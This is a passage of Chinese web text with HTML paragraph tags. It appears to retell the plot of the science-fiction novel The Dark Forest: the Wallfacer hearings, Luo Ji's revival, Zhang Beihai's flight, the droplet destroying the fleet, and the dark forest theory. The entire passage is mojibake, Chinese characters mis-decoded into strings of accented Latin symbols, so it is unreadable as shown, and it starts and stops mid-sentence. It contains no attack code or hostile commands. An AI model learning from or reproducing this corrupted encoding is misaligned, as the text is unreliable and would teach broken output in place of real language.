´å£äººå…ˆå‰ä¹ŸæŠŠèµ„æ–™ä¸Šä¼ åˆ°ç½‘ä¸Šï¼Œèˆ†è®ºå†æ¬¡å“—ç„¶ï¼Œå¤§å®¶æ¥å—ä¸äº†è¿™ç§ç–¯ç‹‚çš„ä¸¾åŠ¨ã€‚åœ¨ä¹‹åçš„å¬è¯ä¼šä¸Šï¼Œé›·è¿ªäºšå…¹çš„é¢å£è€…èº«ä»½è¢«ç»ˆæ­¢ï¼Œåœ¨å‡†å¤‡æŠ“æ•é›·è¿ªäºšå…¹æ—¶ï¼Œä»–æ’’è°è¯´è‡ªå·±çš„æ‰‹ç¯ä¸Šæ˜¯æ‘‡ç¯®ç³»ç»Ÿï¼Œ åªè¦è‡ªå·±æœ‰ç”Ÿå‘½å±é™©ï¼Œæ‰‹ç¯ä¸Šçš„ä¿¡å·å°±ä¼šä¸­æ–­ï¼Œä»è€Œå¼•çˆ†çº½çº¦å¸‚çš„æ°¢å¼¹ï¼Œå¦‚æœçº½çº¦å¸‚çš„æ°¢å¼¹è¢«è§¦ç¢°ä¹Ÿä¼šçˆ†ç‚¸ï¼Œé›·è¿ªäºšå…¹æˆåŠŸé€ƒè„±ï¼Œåœ¨å›å›½çš„è·¯ä¸Šï¼Œå¤§å®¶æ‰çŸ¥é“è¿™ä¸ªæ‘‡ç¯®ç³»ç»Ÿä¸è¿‡æ˜¯ä»–ä¸ºäº†è„±èº«çš„å¹Œå­ã€‚</p><p>&emsp;&emsp;å›å›½åï¼Œè¿™ä½ä»¥å¾€è¢«å›½æ°‘è®¤ä¸ºæ˜¯å¤§è‹±é›„çš„å‰æ€»ç»Ÿ å¹¶æ²¡æœ‰è¿æ¥é²œèŠ±å’ŒæŒå£°ï¼Œè€Œæ˜¯æ— æ•°çš„çŸ³å¤´ï¼Œé›·è¿ªäºšå…¹å½“åœºè¢«æ— æ•°çš„çŸ³å¤´ï¼Œç ¸æ­»ã€‚</p><p>&emsp;&emsp;ä¸€ç™¾å…«åäº”å¹´åï¼Œç½—è¾‘ä»å†¬çœ ä¸­è¢«å«é†’ï¼Œä»–å‘ç°å‘¨å›´çš„äººå……æ»¡è‡ªä¿¡ï¼Œåœ¨è¿™ä¸ªæ—¶ä»£ï¼Œäººä»¬çš„åŸºå› æ¸æ¸è¿›åŒ–ï¼Œåˆ°å¤„éƒ½æ˜¯å¸…å“¥ç¾å¥³ï¼Œäººç±»æŒæ¡äº†ä¸¤ä¸ªæŠ€æœ¯ï¼Œå¯æ§æ ¸èšå˜ï¼Œè¿™é¡¹æŠ€æœ¯çš„å‡ºç°ï¼Œå½»åº•è§£å†³äº†äººç±»çš„èƒ½æºé—®é¢˜ï¼ŒçŸ³æ²¹èƒ½æºè¢«æ·˜æ±°äº†ã€‚åœ¨è¿™ä¸ªæ—¶ä»£å·²ç»æ²¡æœ‰çœç”µçœæ°´çš„æ¦‚å¿µäº†ï¼Œæ‰€æœ‰çš„ç”µå™¨éƒ½ä¸å†ä½¿ç”¨ç”µæ± ã€‚å¦ä¸€é¡¹æ˜¯ï¼ŒåŸºå› æ”¹é€ æŠ€æœ¯ï¼Œå½»åº•è§£å†³äº†ç²®é£Ÿé—®é¢˜ã€‚</p><p>&emsp;&emsp;ç°åœ¨äººä»¬é€ å‡ºäº†ä¸¤åƒè‰˜å¤ªç©ºæˆ˜èˆ°ï¼Œé£èˆ¹èƒ½è¾¾åˆ°å…‰é€Ÿçš„ç™¾åˆ†ä¹‹åäº”ï¼Œæ¯”ä¸‰ä½“äººçš„é£èˆ¹å¿«å¤šäº†ã€‚é¢å£è®¡åˆ’å¾ˆæ—©å°±è¢«åºŸæ­¢äº†ï¼Œç½—è¾‘å½“å¹´å‘å¤ªç©ºå‘é€çš„å’’è¯­ï¼Œè¢«å½“æˆäº†ç¬‘è¯ã€‚ä¸ºäº†å‡†å¤‡ä¸ä¸‰ä½“äººä½œæˆ˜ï¼Œäººä»¬åœ¨ä¸€åƒç±³ä»¥ä¸‹å»ºç«‹äº†åŸå¸‚ï¼Œå¤§å¤šæ•°äººç”Ÿæ´»åœ¨åœ°ä¸‹ï¼Œå°‘éƒ¨åˆ†äººç”Ÿæ´»åœ¨åœ°é¢ä¸Šï¼Œä¸»æµè¯­è¨€å˜æˆäº†è‹±è¯­ä¸€æ±‰è¯­çš„æ‚ç³…è¯­è¨€ï¼Œå¸Œæœ›ä¸‰ä½“äººå é¢†åœ°çƒçš„å›å†›ç»„ç»‡ï¼Œæ—©åœ¨ä¸€ä¸ªä¸–çºªå‰å°±è¢«æ¶ˆç­äº†ã€‚ä¹‹å‰äººç±»ç»å†çš„å¤§ä½è°·ï¼Œé‚£æ—¶å€™ä¸–ç•Œæ ¼å±€ç´§å¼ å¼‚å¸¸ï¼Œäººäººéƒ½å¤„åœ¨å¤‡æˆ˜çŠ¶æ€ï¼Œä½è½çš„æƒ…ç»ªä¸‹ï¼Œäººä»¬è‡ªæš´è‡ªå¼ƒï¼Œç»æµå¼€å§‹å¤§æ»‘å¡ï¼Œç¯å¢ƒå¼€å§‹æ¶åŒ–ï¼Œå…¨ä¸–ç•Œéƒ½å‘ç”Ÿäº†é¥¥è’ã€‚äººåƒäººæˆäº†å¸¸æ€ï¼Œäººå£æ€¥å‰§ä¸‹é™ï¼Œåæ¥è¶Šæ¥è¶Šå¤šäººé€æ¸æƒ³æ˜ç™½ï¼Œæ—¢ç„¶ç¾éš¾ä¸€å®šè¦æ¥ä¸´ï¼Œç—›è‹¦çš„ä¸€å¤©ä¹Ÿæ˜¯ä¸€å¤©ï¼Œå¼€å¿ƒçš„ä¸€å¤©ä¹Ÿæ˜¯ä¸€å¤©ï¼Œäºæ˜¯ä»–ä»¬ç«™å‡ºæ¥å¼•å¯¼å¤§å®¶ï¼ŒæŒ¯è‡‚é«˜å‘¼ï¼Œç»™å²æœˆä»¥æ–‡æ˜ï¼Œè€Œä¸æ˜¯ç»™æ–‡æ˜ä»¥å²æœˆã€‚</p><p>&emsp;&emsp;éšå³äººç±»çš„å¤å…´è¿åŠ¨å…´èµ·ï¼Œæ–‡æ˜åŠ é€Ÿè¿›æ­¥ï¼Œç½—è¾‘ä»å†¬çœ ä¸­æ¢å¤äº†ä¸å°‘åï¼Œå‚åŠ äº†æœ€åä¸€æ¬¡é¢å£è€…è¿œç¨‹å¬è¯ä¼šã€‚åœ¨ä¼šä¸Šï¼Œä»–çœ‹åˆ°äº†å·²ç»è‹é†’çš„å¸Œæ©æ–¯å’Œä»–çš„å¦»å­åŠ©æ‰‹ï¼Œå¬è¯ä¼šåƒä»–ä»¬å®£å¸ƒäº†ï¼Œé¢å£è€…è®¡åˆ’è¢«ç»ˆæ­¢ï¼Œæ‰€æœ‰é¢å£è€…æ¢å¤æ™®é€šäººçš„èº«ä»½ï¼Œå¸Œæ©æ–¯çš„äº²å­åœ¨å¤§ä¼šä¸Šï¼Œå¯¹ä¸ˆå¤«è¯´é“ï¼Œæˆ‘æ˜¯ä½ çš„ç ´å£äººã€‚ä½ æ‰€åˆ¶é€ çš„æ€æƒ³é’¢å°ï¼Œç»™æ¯ä¸ªäººæ‰“ä¸Šçš„æ€æƒ³å‰é¢éƒ½åŠ äº†è´Ÿå·ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™äº›äººï¼Œåšä¿¡çš„æ˜¯äººç±»å¿…è´¥ï¼Œä½ æ˜¯æƒ³åŸ¹å…»å‡ºä¸€æ‰¹é€ƒäº¡ä¸»ä¹‰è€…ï¼Œé€ƒå‡ºåœ°çƒã€‚</p><p>&emsp;&emsp;ä¼šä¸Šçš„äººæ— ä¸æƒŠè®¶ï¼Œå¤ªç©ºå†›å¼€å§‹è°ƒæŸ¥è¿™æ‰¹è¢«æ‰“ä¸Šäººç±»å¿…è´¥ä¿¡ä»°çš„é’¢å°æ—ï¼Œæ•£ä¼šåä¸ä¹…ï¼Œè¿™ä½é¢å£è€…çš„å¦»å­ï¼Œå°±åˆ‡è…¹è‡ªå°½äº†ã€‚è€Œé¢å£è€…å¸Œæ©æ–¯å¹¶æ²¡æœ‰å¾—åˆ°åˆ¶è£ã€‚ä¼šåï¼Œç½—è¾‘ç¢°ä¸Šäº†è€æœ‹å‹å²å¼ºï¼Œæ²¡å¤šä¹…ï¼Œç½—è¾‘å°±å†æ¬¡é­åˆ°äº†æš—æ€ï¼Œç¬¬ä¸€æ¬¡å·®ç‚¹è¢«æ— äººæ±½è½¦æ’æ­»ï¼Œç¬¬äºŒæ¬¡å·®ç‚¹å è½èº«äº¡ï¼Œç¬¬ä¸‰æ¬¡å·®ç‚¹è¢«æœºå™¨äººæœåŠ¡å‘˜æ…æ­»ï¼Œç¬¬å››æ¬¡å·®ç‚¹è¢«æ¯’æ­»ï¼Œç¬¬äº”æ¬¡å·®ç‚¹è¢«åªèƒ½æ²™å‘å‹’æ­»ï¼Œè¿™æ¬¡æš—æ€ä»–çš„ï¼Œæ˜¯å«åškillerçš„æš—æ€ç—…æ¯’ï¼Œå¥½åœ¨ä¸€å‘è­¦è§‰æ•é”çš„å²å¼ºåœ¨ä»–èº«è¾¹æ•‘äº†ä»–ã€‚éšåï¼Œä»–ä»¬ä¸ºäº†èº²é¿ç”µè„‘è¿½æ€ï¼Œç¦»å¼€äº†åœ°ä¸‹åŸå¸‚ï¼Œå»äº†åœ°è¡¨ã€‚</p><p>&emsp;&emsp;å¦ä¸€è¾¹çš„å¢æ´æœªæ¥çš„æŒ‡æŒ¥å®˜ä»¬è¢«å”¤é†’ï¼Œç”±äºé’¢å°æ—éšè—å¾—å¾ˆæ·±ï¼Œæ‰€ä»¥è¿™æ‰¹è¢«å”¤é†’çš„å†›å®˜ï¼Œè¢«ä»»å‘½ä¸ºæ‰§è¡Œèˆ°é•¿ï¼Œå…¶ä¸­å°±åŒ…æ‹¬ç« åŒ—æµ·ã€‚ç« åŒ—æµ·ç™»ä¸Šäº†è‡ªç„¶é€‰æ‹©å·ï¼Œèˆ°é•¿æ˜¯ä¸€ä½æ¼‚äº®çš„å¥³ç”Ÿï¼Œåå«ä¸œæ–¹å»¶ç»­ï¼Œä»–ç»™äº†ç« åŒ—æµ·ä¸€æŠŠæ‰‹æªï¼Œè¯´ï¼Œå¦‚æœå‘ç°æˆ‘æœ‰å¤±è´¥æ³¨æ„çš„æƒ³æ³•ï¼Œå¯ç”¨å®ƒæ€äº†æˆ‘ã€‚ç»“æœæŒ‡æŒ¥æƒçš„ç« åŒ—æµ·ç«‹åˆ»åšå‡ºäº†è®©æ‰€æœ‰äººéƒ½æ„æ–™ä¸åˆ°çš„ä¸¾åŠ¨ï¼Œå®ƒé€šè¿‡å„ç§æŒ‡ä»¤ï¼ŒåŠ«æŒè‡ªç„¶é€‰æ‹©å·ä¸Šçš„2000åèˆ¹å‘˜ï¼Œè·‘è·¯äº†ã€‚</p><p>&emsp;&emsp;å…¶å®ä»–ä¸€ç›´éƒ½æ˜¯ä¸€åä¼ªè£…å¾ˆå¥½çš„å¤±è´¥ä¸»ä¹‰è€…ï¼Œä»–åšä¿¡äººç±»å¿…è´¥ï¼Œèˆ°é˜Ÿå¸ä»¤éƒ¨çš„å¸ä»¤ä»¬éƒ½æ‡µäº†ï¼Œè¿™æ˜¯ä»€ä¹ˆçŠ¶å†µï¼Ÿå¸ä»¤å®˜ä»¬åæ˜ äº†åŠå¤©æ‰å›è¿‡ç¥æ¥æ´¾å‡ºè¿½å‡»èˆ°é˜Ÿã€‚å¦ä¸€è¾¹ï¼Œä¸–ç•Œæ”¿åºœå¼€å§‹å•†è®¨å¦‚ä½•å®‰ç½®å³å°†è¢«äººç±»æ‰“è´¥çš„ä¸‰ä½“äººã€‚ä¸æ­¤åŒæ—¶ï¼Œäººç±»è§‚æµ‹åˆ°ï¼Œä¸‰ä½“èˆ°é˜Ÿæ´¾å‡ºäº†ä¸€ä¸ªå°å‹æ¢æµ‹å™¨ï¼Œå·²ç»è¿›å…¥äº†å¤ªé˜³ç³»ã€‚å›½é™…èˆ°é˜Ÿå†³å®šï¼Œæ´¾å‡ºå…¨éƒ¨ä¸¤åƒé›¶åäº”è‰˜æ’æ˜Ÿçº§æˆ˜èˆ°ï¼Œæ‹¦æˆªä¸‰ä½“æ¢æµ‹å™¨ï¼Œä»¥æ˜¾ç¤ºåœ°çƒçš„é›„å¨ã€‚</p><p>&emsp;&emsp;æ­¤æ—¶åœ°çƒä¸Šæ‰€æœ‰çš„åª’ä½“éƒ½åœ¨ç›´æ’­è¿™ä¸€ç››å†µï¼Œå‡ ä¹æ‰€æœ‰äººéƒ½æ¿€åŠ¨åœ°å®ˆåœ¨å±ç›®å‰ï¼Œæœ‰çš„å‘å‡ºå…´å¥‹çš„å°–å«ï¼Œæœ‰çš„æ„ŸåŠ¨å¾—åšå••å¤§å“­ï¼Œæ— äººä¸ä¸ºè‡ªå·±æ–‡æ˜è€Œè‡ªè±ªï¼Œå„åœ°å¼€å§‹äº†æ¥è¿ä¸æ–­çš„ç‹‚æ¬¢ï¼Œèˆ°é˜Ÿç´§å¯†çš„æ’æˆäº†100X20çš„é•¿æ–¹å½¢çŸ©é˜µï¼Œä¸€èµ·å»è¿æ¥ã€‚83å²çš„ä¸ä»ªå·²ç»æ˜¯è¿™ä¸ªæ—¶ä»£æœ€å¾·é«˜æœ›é‡çš„ç§‘å­¦å®¶äº†ï¼Œä»–è¢«é€‰ä¸­ä½œä¸ºç¬¬ä¸€ä¸ªæ¥è§¦ä¸‰ä½“å°å‹æ¢æµ‹å™¨çš„äººã€‚å…ˆå¤´é£èˆ¹æ•è·äº†è¿™æšæ¢æµ‹å™¨ï¼Œè¿™æšæ¢æµ‹å™¨å¤–è¡¨åƒæäº†ä¸€æ»´æ°´ï¼Œå®ƒçš„è¡¨æ˜å…‰æ»‘æ— æ¯”ï¼Œå¦‚åŒæ˜é•œã€‚äºæ˜¯äººä»¬ç»™äº†å¥¹ä¸€ä¸ªç§°å‘¼ï¼Œæ°´æ»´ã€‚</p><p>&emsp;&emsp;è°¨æ…çš„ä¸ä»ªåœ¨æ¥è§¦æ°´æ»´å‰ï¼Œä»¤ä»–æ‰€åœ¨çš„é‡å­å·é£èˆ¹ï¼Œéšæ—¶å‡†å¤‡ä»¥æœ€é«˜é€Ÿåº¦è·‘è·¯ï¼ŒåŒæ—¶ä¸´è¿‘çš„é’é“œæ—¶ä»£å·å·²ç»å…¥äº†å‡†å¤‡çŠ¶æ€ã€‚æ°´æ»´è¢«æˆåŠŸæ•è·ï¼Œè¿™ä¸€ç”»é¢ä¼ åˆ°äº†åœ°çƒã€‚å‡ ä¹æ‰€æœ‰çš„äººéƒ½åœ¨æ¬¢å‘¼é›€è·ƒï¼Œçƒ­æ³ªç›ˆçœ¶ã€‚ä¸ä»ªåšå£«ä¸Šåƒä»”ç»†è§‚çœ‹ï¼Œä»–å‘ç°æ°´æ»´çš„è¡¨é¢åŠå…¶å…‰æ»‘ï¼Œå½“ä»–ç”¨æ˜¾å¾®é•œçœ‹æ°´æ»´è¡¨é¢æ—¶ï¼Œä»–å“åäº†ã€‚æ— è®ºæ˜¯æ”¾å¤§ä¸€ç™¾å€ï¼Œè¿˜æ˜¯ä¸€åƒå€ï¼Œä¸€ä¸‡å€ï¼Œä¸€ç™¾ä¸‡å€ï¼Œä¸€åƒä¸‡å€ã€‚æ°´æ»´çš„è¡¨é¢è¿˜æ˜¯å…‰æ»‘æ— æ¯”ï¼Œåƒé•œé¢ä¸€æ ·ã€‚è¿™æ„å‘³ç€ï¼Œæ”¹ç‰©ä½“å¯†åº¦æå…¶çš„å¤§ï¼Œæ— æ¯”çš„åšç¡¬ï¼Œå®ƒå¯ä»¥è½»æ˜“çš„æ¨ªç©¿åœ°çƒï¼Œä¸”ä¸ä¼šæœ‰ä¸æ¯«æŸä¼¤ï¼Œå°±åƒå­å¼¹ç©¿è¿‡å¥¶é…ªã€‚äººä»¬ç°åœ¨æ‰€èƒ½é€ å‡ºæœ€å…‰æ»‘çš„ä¸œè¥¿ï¼Œæ”¾å¤§ä¸ªå‡ ç™¾å€ï¼Œå°±å¯ä»¥çœ‹åˆ°ç²—ç³™çš„åƒé‡é‡å±±å³°çš„çº¹ç†ã€‚æƒŠè®¶æ— æ¯”çš„ä¸ä»ªåšå£«ç¼“ç¼“å›è¿‡ç¥æ¥ï¼Œè‡ªè¨€è‡ªè¯­é“ï¼Œæ¯ç­ä½ ï¼Œä¸ä½ ä½•å¹²ã€‚éšåä¸ä»ªå¤§å–Šä¸€å£°ï¼Œå‚»å­©å­ä»¬å¿«é€ƒå•Šã€‚ä½†ä¸€åˆ‡éƒ½å¤ªæ™šäº†ã€‚</p><p>&emsp;&emsp;æ°´æ»´å¹²æ‰°äº†ä¿¡å·ï¼Œéšåå°¾å·´å¼€å§‹å‡ºç°è“è‰²çš„å…‰ç¯ï¼Œä¸æ–­åŠ é€Ÿï¼Œæ•è·ä»–çš„é£èˆ¹ç¬é—´æ±½åŒ–ï¼Œéšåå®ƒä»¥å…¨é€Ÿç²¾å‡†åœ°æ’å‘ï¼Œç¬¬ä¸€æ’ç¬¬ä¸€åˆ—ç¬¬ä¸€è‰˜æˆ˜èˆ°çš„ç‡ƒæ–™èˆ±ã€‚ç”±äºè¿™äº›æˆ˜èˆ°ç”¨çš„éƒ½æ˜¯æ ¸èšå˜ç‡ƒæ–™ï¼Œç‡ƒæ–™èˆ±ä¸€ç‚¸å°±ç›´æ¥ç©å®Œï¼Œå¯è§ä¸‰ä½“äººå¯¹äººç±»æˆ˜èˆ°çš„å¼±ç‚¹äº†å¦‚æŒ‡æŒã€‚å®ƒå‘çŸ³å­åˆ’è¿‡ç©ºæ°”ä¸€æ ·ç©¿è¿‡ä¸€è‰˜åˆä¸€è‰˜æˆ˜èˆ°ï¼Œæ•´æ•´é½é½çš„æˆ˜èˆ°åƒé­ç‚®ä¸€æ ·ï¼Œåœ¨å¤ªç©ºä¸­ä¸æ–­ç‚¸å¼€äº†èŠ±ã€‚æ°´æ»´ä»…ä»…ç”¨äº†1åˆ†28ç§’å°±è´¯ç©¿äº†ç¬¬ä¸€é˜Ÿåˆ—çš„ä¸€ç™¾è‰˜æˆ˜èˆ°ã€‚ç”±äºæ°´æ»´å¤ªå°ï¼Œäººä»¬å¯¹é›·è¾¾æ ¹æœ¬æ£€æµ‹ä¸åˆ°ï¼Œåæ’çš„èˆ°é˜Ÿå®Œå…¨ä¸çŸ¥é“æ€ä¹ˆå›äº‹ï¼Œå°±çœ‹è§è¿™çœ¼å‰ç„°ç«è¡¨æ¼”ã€‚</p><p>&emsp;&emsp;æ°´æ»´æ­¤æ—¶åšå‡ºäº†ä¸€ä¸ªä¸å¯æ€è®®çš„é”è§’æ€¥è½¬ï¼Œä¸æ¯«æ²¡æœ‰å‡é€Ÿçš„æ’å‘ç¬¬äºŒé˜Ÿåˆ—çš„é£èˆ¹ï¼Œåæ¥ç§‘å­¦å®¶çœ‹åˆ°è¿™æ®µå½±åƒï¼Œéƒ½å‚»äº†ã€‚æ°´æ»´çš„æ”»å‡»æ–¹å¼ï¼Œéå¸¸çš„åŸå§‹ï¼Œå°±æ˜¯ç”¨å¤´æ’ã€‚å½“ç¬¬ä¸‰æ’æˆ˜èˆ°ä¹Ÿç‚¸å®Œåï¼Œèˆ°é˜Ÿå¼€å§‹æ•£å¼€å‡†å¤‡é€ƒè·‘ã€‚è™½ç„¶ä»–ä»¬ä¸çŸ¥é“æ€ä¹ˆäº†ï¼Œä½†è¿™æ ·ç‚¸ä¸‹å»ï¼Œä¸å¾—ä¸è·‘ã€‚</p><p>&emsp;&emsp;åœ¨æ•£å¼€çš„è¿‡ç¨‹ä¸­è™½ç„¶æœ‰æˆ˜èˆ°å‘ç°äº†æ°´æ»´ï¼Œå¹¶è¿›è¡Œåå‡»ï¼Œä½†ç‚®å¼¹æ‰“åˆ°æ°´æ»´ä¸Šï¼Œä¸æ¯«æ²¡æœ‰ååº”ã€‚åªæ˜¯è®©ä»–ç¨å¾®å‡é€Ÿäº†ä¸€ä¸‹ã€‚æ°´æ»´å°±åƒä¸€æšæ­»ç¥çš„ç»£èŠ±é’ˆï¼Œä»¥æœ€çŸ­çš„è·¯ç¨‹ï¼Œæ¥å›ç©¿æ¢­åœ¨æˆ˜èˆ°ä¹‹é—´ã€‚æ­£å¸¸æˆ˜èˆ°åªæœ‰äº”ååˆ†é’Ÿï¼Œäººç±»æ‰€æœ‰çš„éª„å‚²ä¸è£å…‰ã€‚å°±è¢«ä¸€æšå°å°çš„æ¢æµ‹å™¨ï¼Œé¡·åˆ»è¦†ç­ã€‚</p><p>&emsp;&emsp;æ¯ç­ä½ ï¼Œä¸ä½ ä½•å¹²ã€‚è¿™ä¸ªæ•…äº‹å¯ä»¥çœ‹å‡ºï¼Œä¸¤ä¸ªç§‘æŠ€é—´å­˜åœ¨å·¨å¤§å·®è·çš„æ–‡æ˜ï¼Œæ˜¯ä¸å¯èƒ½æ‰“çš„æœ‰æ¥æœ‰å¾€çš„ã€‚</p><p>&emsp;&emsp;è¿™åœºæˆ˜æ–—ï¼Œåªæœ‰ä¸¤è‰˜æˆ˜èˆ°é€ƒç¦»äº†æˆ˜åœºï¼Œä»–ä»¬åˆ†åˆ«æ˜¯é’é“œå·å’Œé‡å­å·ã€‚ä¸ä»–ä»¬ä¸åŒæ–¹å‘çš„æ­£åœ¨é€ƒäº¡çš„è‡ªç„¶é€‰æ‹©å·ï¼Œä»¥åŠè¿½å‡»å®ƒçš„å››è‰˜æˆ˜èˆ°ã€‚è“è‰²ç©ºé—´å·ï¼Œä¼ä¸šå·ï¼Œæ·±ç©ºå·ï¼Œç»ˆæè§„å¾‹å·ï¼Œä¹Ÿå¹¸å­˜äº†ä¸‹æ¥ã€‚</p><p>&emsp;&emsp;ç« åŒ—æµ·æˆä¸ºäº†è¿™äº”è‰˜æˆ˜èˆ°å…¬è®¤çš„è‹±é›„ï¼Œå¦‚æœä»–ä¹Ÿæ˜¯é¢å£è€…çš„è¯ï¼Œä»–ä¼šæ˜¯ä¸€åæˆåŠŸçš„é¢å£è€…ã€‚è¿™æ— äº”è‰˜æˆ˜èˆ°å¼€å§‹å‰å¾€å¯»æ‰¾æ–°å®¶å›­ï¼Œä½†ä»–ä»¬å‘ç°ï¼Œæœ€è¿‘çš„å¤ªé˜³ç³»ï¼Œä»¥ç°åœ¨çš„é€Ÿåº¦èˆªè¡Œï¼Œä¹Ÿè¦ä¸¤åƒå¹´ã€‚äº”è‰˜æˆ˜èˆ°çš„ç‡ƒæ–™ï¼Œé…ä»¶ï¼Œè¡¥ç»™ï¼Œåªå¤Ÿä¸€è‰˜é£èˆ¹è¾¾åˆ°ç›®çš„åœ°ã€‚æ‰€æœ‰äººéƒ½æ¸æ¸æ˜ç™½è¿™ä¸ªæ®‹é…·çš„äº‹å®ï¼Œä¸æ˜¯ä½ æ­»ï¼Œå°±æ˜¯æˆ‘æ´»ã€‚éšç€æ—¶é—´çš„æ¨ç§»ã€‚äº”è‰˜æˆ˜èˆ°å¼€å§‹äº†å½¼æ­¤é—´çš„äº’ç›¸çŒœç–‘ï¼Œéƒ½æ‹…å¿ƒå¯¹æ–¹ä¼šé¦–å…ˆå‘åŠ¨æ”»å‡»ã€‚ç»ˆäºï¼Œç« åŒ—æµ·ä¸‹å®šå†³å®šè¦ä½¿ç”¨æ¬¡å£°æ³¢æ°¢å¼¹é¦–å…ˆå‘åŠ¨æ”»å‡»ï¼Œè¿™ç§æ”»å‡»ä¸ä¼šå¯¹èˆ¹ä½“é€ æˆä¼¤å®³ï¼Œåªä¼šæ¶ˆç­èˆ¹å†…æ‰€æœ‰ç”Ÿå‘½ã€‚ä½†å°±å½“ä»–è¦æ‘ä¸‹å‘å°„é”®çš„æ—¶å€™ï¼Œè‡ªç„¶é€‰æ‹©å·é¦–å…ˆé­é‡äº†æ¬¡å£°æ³¢æ°¢å¼¹è¢­å‡»ã€‚åœ¨å¬åˆ°é¢„è­¦è¢­å‡»çš„è­¦æŠ¥æ—¶ï¼Œç« åŒ—æµ·æ”¾å¼ƒäº†å‘å°„ï¼Œæ„å‘³æ·±é•¿çš„è¯´äº†ä¸€å¥ï¼Œæ²¡å…³ç³»ï¼Œéƒ½ä¸€æ ·ã€‚</p><p>&emsp;&emsp;ç¬é—´ï¼Œè‡ªç„¶é€‰æ‹©å·å…¨ä½“èˆ¹å‘˜ï¼Œåœ¨æ¬¡å£°æ³¢æ°¢å¼¹çš„è¢­å‡»ä¸‹ï¼Œé›†ä½“é˜µäº¡ã€‚å‘èµ·é¦–æ”»çš„æ˜¯ç»ˆæè§„å¾‹å·æˆ˜èˆ°ï¼Œä»–å‘å…¶ä»–çš„æˆ˜èˆ°ä¹Ÿå‘å‡ºäº†æ¬¡å£°æ³¢æ°¢å¼¹ï¼Œä½†ç»ˆæè§„å¾‹å·å¹¶æ²¡æœ‰æˆä¸ºå¹¸å­˜å„¿ï¼Œæ—©å°±å‡†å¤‡å¥½çš„è“è‰²ç©ºé—´å¥½æŠ½å¹²äº†èˆ¹å†…çš„ç©ºæ°”ï¼Œæ²¡æœ‰ç©ºæ°”ï¼Œæ¬¡å£°æ³¢å°±ä¸ä¼šæœ‰ä»»ä½•ä½œç”¨ã€‚è“è‰²ç©ºé—´å·éšæœºåå‡»ï¼Œç”¨å…¨éƒ¨æ­¦å™¨é›†ç«ç»ˆæè§„å¾‹å·ï¼Œç»ˆæè§„å¾‹å·è¢«å½»åº•æ‘§æ¯ã€‚éšåï¼Œè“è‰²ç©ºé—´å¥½å¼€å§‹æ‰“æ‰«æˆ˜åœºï¼Œä»–ä»¬æ‹¿èµ°äº†æ‰€æœ‰èƒ½å¸¦çš„ä¸œè¥¿ï¼Œé£å‘äº†è¿œæ–¹ã€‚ä»–ä»¬æ‰¿è½½çš„äººç±»çš„å…¨éƒ¨æ€æƒ³å’Œè®°å¿†ï¼Œæ€€æŠ±ç€åœ°çƒæ‰€æœ‰çš„è£å…‰ä¸æ¢¦æƒ³ï¼Œé»˜é»˜åœ°æ¶ˆå¤±åœ¨æ°¸æ’çš„å¤œè‰²ä¸­ã€‚</p><p>&emsp;&emsp;å†æ¥çœ‹çœ‹åœ°çƒè¿™è¾¹ï¼Œæ­£æ‰€è°“ç‰©æå¿…åï¼Œä¹æç”Ÿæ‚²ã€‚ä¹‹å‰è¿˜æ‰‹èˆè¶³è¹ˆæ¬¢å‘¼åº†ç¥çš„äººä»¬ï¼Œå½“äº²çœ¼çœ‹è§æˆ˜èˆ°åƒé­ç‚®ä¸€æ ·ç‚¸æ²¡æ—¶ï¼Œç¬é—´å…¨éƒ¨å´©æºƒï¼Œåœ°çƒäººå¼€å§‹é™·å…¥ç»æœ›ï¼Œè‡ªæ€çš„äººç»œç»ä¸ç»ã€‚ç»å¤§å¤šæ•°äººé€šè¿‡è‚†æ— å¿Œæƒ®çš„çºµæ¬²æ¥éº»ç—¹è‡ªå·±ã€‚ç»æœ›å……æ–¥ç€è¿™ä¸ªä¸–ç•Œã€‚æ°´æ»´é£å‘äº†å¤ªé˜³ï¼Œå¹¶ä¸æ–­å¯¹å¤ªé˜³å‘å‡ºå¼ºçƒˆçš„å¹²æ‰°ä¿¡å·ï¼Œä»æ­¤äººç±»å†ä¹Ÿæ— æ³•é€šè¿‡å¤ªé˜³ä½œä¸ºæ”¾å¤§å¤©çº¿ï¼Œå‘å®‡å®™å‘å‡ºä»»ä½•ä¿¡å·ã€‚</p><p>&emsp;&emsp;ç½—è¾‘è¿™è¾¹ï¼Œå½“ä»–å’Œå²å¼ºä»å¤–é¢å›åˆ°å®¶æ—¶ï¼Œå‘ç°æˆåƒä¸Šä¸‡çš„äººåœ¨ç­‰ä»–ï¼Œäººä»¬éƒ½æŠŠä»–å¥‰ä¸ºæ•‘ä¸–ä¸»ï¼Œå…¨éƒ¨è·ªåœ¨ç½—è¾‘é¢å‰ã€‚ä»–ä»¬è¯´ï¼Œä¸»å•Šï¼Œæ•‘æ•‘æˆ‘ä»¬å§ã€‚åŸæ¥ç½—è¾‘ä¹‹å‰å‘å‡ºçš„å’’è¯­ç”Ÿæ•ˆäº†ï¼Œé‚£é¢—æŒ‡å®šçš„æ’æ˜Ÿè¢«ä¸€é¢—å…‰ç²’ç©¿è¿‡ï¼Œçˆ†ç‚¸äº†ã€‚</p><p>&emsp;&emsp;ç°åœ¨æ‰€æœ‰äººéƒ½ç›¸ä¿¡ç½—è¾‘æ˜¯æŸç§ç¥ï¼Œç½—è¾‘è¢«æ¢å¤äº†é¢å£è€…èº«ä»½ï¼Œæˆä¸ºäº†åœ°çƒä¸Šå”¯ä¸€çš„é¢å£è€…ï¼ŒåŒæ—¶ä¹Ÿæˆä¸ºäº†äººç±»å”¯ä¸€çš„ä¿¡ä»°ã€‚ç°åœ¨æ— è®ºä»–è¯´ä»€ä¹ˆï¼Œäººä»¬éƒ½ä¼šç…§åŠã€‚ç½—è¾‘ç«‹åˆ»æäº†ä¸¤æ¡è¦æ±‚ï¼Œç¬¬ä¸€ã€æ‰€æœ‰åŸå¸‚æ¢å¤ç§©åºï¼›ç¬¬äºŒã€æ‰€æœ‰äººéƒ½å›å®¶å§ï¼Œè®©æˆ‘é™é™ã€‚äººç¾¤æ•£å°½åï¼Œé€»è¾‘ç»™æƒŠè®¶ä¸å·²çš„å²å¼ºè§£é‡Šäº†ä¸ºä»€ä¹ˆå’’è¯­ä¼šç”Ÿæ•ˆï¼Œä»–æå‡ºäº†é»‘æš—æ£®æ—æ³•åˆ™ã€‚</p><p>&emsp;&emsp;é¦–å…ˆï¼Œå®‡å®™çš„æ€»é‡æ˜¯æ’å®šçš„ï¼Œä½†å®‡å®™ä¸­æœ‰æ— 